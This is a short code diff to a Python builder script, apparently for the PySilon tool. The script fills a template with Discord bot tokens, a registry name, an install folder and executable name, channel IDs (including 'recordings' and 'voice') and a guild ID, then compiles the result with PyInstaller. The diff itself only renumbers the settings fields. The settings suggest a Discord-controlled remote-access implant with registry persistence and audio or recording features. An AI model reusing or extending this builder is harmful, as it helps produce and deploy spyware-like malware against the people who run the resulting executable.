@@ -73,10 +73,10 @@ with open('main_prepared.py', 'w') as edit_source_code:
     for line in range(len(source_code)):
         if mode == 1:
             match line:
-                case 46: edit_source_code.write('bot_tokens = [\'' + settings[5] + '\']\n')
-                case 47: edit_source_code.write('software_registry_name = \'' + settings[6] + '\'\n')
-                case 48: edit_source_code.write('software_directory_name = \'' + (settings[7] if settings[7] != '' else settings[6]) + '\'\n')
-                case 49: edit_source_code.write('software_executable_name = \'' + (settings[8] if settings[8] != '' else (settings[7] if settings[7] != '' else settings[6]) + '.exe') + '\'\n')
+                case 46: edit_source_code.write('bot_tokens = [\'' + settings[6] + '\']\n')
+                case 47: edit_source_code.write('software_registry_name = \'' + settings[7] + '\'\n')
+                case 48: edit_source_code.write('software_directory_name = \'' + (settings[8] if settings[8] != '' else settings[7]) + '\'\n')
+                case 49: edit_source_code.write('software_executable_name = \'' + (settings[9] if settings[9] != '' else (settings[8] if settings[8] != '' else settings[7]) + '.exe') + '\'\n')
                 case 52: edit_source_code.write('    \'info\': ' + settings[0] + ',\n')
                 case 53: edit_source_code.write('    \'main\': ' + settings[1] + ',\n')
                 case 54: edit_source_code.write('    \'spam\': ' + settings[2] + ',\n')
@@ -98,7 +98,7 @@ with open('main_prepared.py', 'w') as edit_source_code:
                 case 56: edit_source_code.write('    \'recordings\': None,\n')
                 case 57: edit_source_code.write('    \'voice\': None\n')
                 case 60: edit_source_code.write('secret_key = \'' + get_file_hash('PySilon.key') + '\'   # Don\'t touch this line (just leave)\n')
-                case 61: edit_source_code.write('guild_id = ' + guild_id)
+                case 61: edit_source_code.write('guild_id = ' + guild_id + '\n')
                 case _: edit_source_code.write(source_code[line])
 
 os.system(pyinstaller_command)
